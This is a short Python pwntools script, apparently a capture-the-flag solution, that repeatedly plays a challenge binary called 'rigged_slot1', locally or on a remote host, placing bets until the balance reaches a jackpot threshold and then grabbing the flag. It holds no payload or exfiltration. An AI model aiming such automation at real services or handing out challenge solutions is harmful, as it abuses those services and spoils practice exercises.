import sys
from pwn import *


# Allows switching between local/GDB/remote execution
def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Binary filename
exe = './rigged_slot1'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

# Jackpot threshold
winning_balance = 133742
got_flag = False

while not got_flag:
    # Start the program
    io = start(level='warn')
    balance = 100
    amount = b'25'

    # Skip the initial output
    io.recvlines(3)
    io.sendline(amount)

    count = 1

    while balance > 0 and not got_flag:
        try:
            # Adjust bet amount
            if balance > 10000:
                amount = b'100'

            io.sendlineafter(b':', amount)
            io.recvuntil(b'Current Balance: ')
            balance = int(io.recvline().decode()[1:].strip())
            info(f'balance: {balance}')
            count += 1

            # Check if we've hit the jackpot (remote)
            if balance >= winning_balance:
                warn("Jackpot threshold reached. Attempting to retrieve flag.")
                flag_output = io.recvline().decode()
                info(flag_output)
                got_flag = True

        except EOFError:
            # Capture flag output in case of EOF (local)
            remaining_output = io.recvall(timeout=5).decode()
            if 'Congratulations' in remaining_output:
                warn("Flag captured via EOF handling:")
                info(remaining_output)
                got_flag = True
            break
        except Exception as e:
            warn(f'Error after {count} bets: {str(e)}')
            break

    warn(f'Total bets placed: {count}')
    io.close()
